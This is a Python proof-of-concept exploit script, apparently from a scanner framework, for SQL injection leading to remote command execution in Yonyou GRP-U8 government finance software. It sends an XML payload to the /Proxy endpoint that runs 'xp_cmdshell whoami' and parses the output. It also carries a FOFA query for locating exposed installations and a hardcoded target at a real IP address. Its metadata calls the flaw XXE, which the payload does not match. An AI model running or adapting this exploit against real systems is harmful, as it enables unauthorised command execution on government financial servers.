# coding:utf-8
import requests
import urllib
import re
requests.packages.urllib3.disable_warnings()

class c2Class(object):
	def __init__(self):
		self.vulname = 'Yonyou GRP-U8 sqli and rce(2020-09)'
		self.vulsystem= 'Yonyou GRP-U8' # ERP-enterprise resource plan 企业资源规划     GRP-goverment resource plan 政府资源规划
		self.vulsystemintro = '用友GRP-U8行政事业财务管理软件是用友公司专注于国家电子政务事业，基于云计算技术所推出的新一代产品，是我国行政事业财务领域最专业的政府财务管理软件。'
		self.vulversion = ''
		self.fofa='app="用友-GRP-U8"' # 或者 title="*GRP-U8*"
		self.findtime='2020-09-18'
		self.cveid=''
		self.refer= 'https://www.cnblogs.com/yuzly/p/13675224.html\nhttps://blog.csdn.net/qq_37602797/article/details/110695423\nhttps://nosec.org/home/detail/4561.html'
		self.bbb='XXE漏洞，源于应用在解析XML输入时没有禁止外部实体载入，导致可加载恶意外部文件。'
		self.pyv=3
		self.testisok=True

		self.vulpath='/Proxy' 
		self.headers={'User-Agent':'Mozilla/4.0 (compatible; MSIE 6.0;)','Content-Type': 'application/x-www-form-urlencoded'}
		self.cmd='whoami'	
		self.sqli_rce="exec xp_cmdshell '%s'"%self.cmd
		self.sqli_info="select user,db_name(),host_name(),@@version"
		self.payload='''cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">%s</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>'''%self.sqli_rce
		self.rc_output=re.compile(r'(?<=<ROWDATA>).+?(?=</ROWDATA>)')
		# self.rc_output_rce=re.compile(r'(?<=<ROW output=").+?(?=")')
		self.flag=200
		self.flag2='<ROW output="'
		self.recovered='java.sql.SQLException'


	def c2Func(self,target):
		status=0
		returnData=''
		if target.startswith(('http://','https://')):
			# 这是为了拿到 <http://主机名>这样格式的数据
			target=target+'/'
			target=target[:target.find('/',8)] # 在https://、http://的协议开头之后寻找/
		else:
			target='http://'+target
		try:
			url=target.strip('/')+self.vulpath
			resp=requests.post(url=url,data=self.payload,headers=self.headers,verify=False,timeout=5)
			# print(resp.status_code)
			resp_content=str(resp.content)
			# print(resp_content)
			if self.flag == resp.status_code and self.flag2 in resp_content:
				result=''
				for i in self.rc_output.findall(resp_content):
					result=result+i
				# print(resp.status_code)
				returnData='%s is vuln(%s),%s:%s'%(url,self.vulname,self.cmd,result)
				status=1
		except Exception as e:
			# print(e)
			returnData=str(e)
		return status,returnData

if __name__ == '__main__':
	target='http://39.99.243.39:88/Proxy'
	pocObj=c2Class()
	print(pocObj.c2Func(target))